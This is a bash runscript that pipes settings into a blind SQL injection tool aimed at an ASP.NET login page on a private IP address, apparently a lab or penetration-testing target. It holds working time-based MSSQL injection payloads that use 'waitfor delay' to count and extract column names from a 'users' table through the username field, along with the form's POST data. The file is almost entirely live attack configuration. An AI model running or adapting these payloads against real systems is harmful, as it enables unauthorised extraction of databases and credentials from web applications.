#!/bin/bash

# runscript for blind-sqli.py
# please mind the quotes in these variables, whereas a single quote is needed for string containing double quotes
# double quotes is needed for string containing single quotes, BUT remember to escape the special $'s so they dont get treated in vairalbes containing NULL

ip="http://192.168.250.63:450/"
attack_type="T"
seconds="5"

# row counting query to iterate, remember the placeholders:
#	$c is to be replaced by ASCII values of characters
# 	$p is to be replaced by the string position value
row_count_payload="' ;  IF ASCII(SUBSTRING(CAST((select count(column_name) from information_schema.columns where table_name = 'users') AS varchar),\$p,1)) = \$c waitfor delay '0:0:5' --"

# NOTE the following three variables will only be needed if the request_type is POST, GET does not require, a new runscript will be needed
request_type="POST"
# post dictionary for requests object, remember to NOT include vuln param, that is entered later when it is been fuzzed by character values
post_dict='{"__VIEWSTATE" : "/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=","__VIEWSTATEGENERATOR":"CA0B0334","__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=", "ctl00$ContentPlaceHolder1$PasswordTextBox": "","ctl00$ContentPlaceHolder1$LoginButton":"Enter"}'
vuln_param='ctl00$ContentPlaceHolder1$UsernameTextBox'

# final query to iterate, remember the placeholders:
#	$c is to be replaced by ASCII values of characters
# 	$p is to be replaced by the string position value
# 	$r is to be replaced by the row position value
query_payload="' ;  IF ASCII(substring((select top 1 column_name from (select top \$r column_name from information_schema.columns where table_name = 'users' order by column_name) z order by column_name desc),\$p,1)) = \$c waitfor delay '0:0:5' --"

# NOTE we did not use echo -e with \t because MSSQL comments doesnt not need a trailing space, for continuity we can change this later
{

sleep 1;
echo $ip
sleep 1;
echo $attack_type 
sleep 1;
echo $seconds
sleep 1;
echo $row_count_payload
sleep 1;
echo $request_type
sleep 1;
echo $post_dict
sleep 1;
echo $vuln_param

sleep 1;
echo $query_payload

} | python3 blind-sqli.py
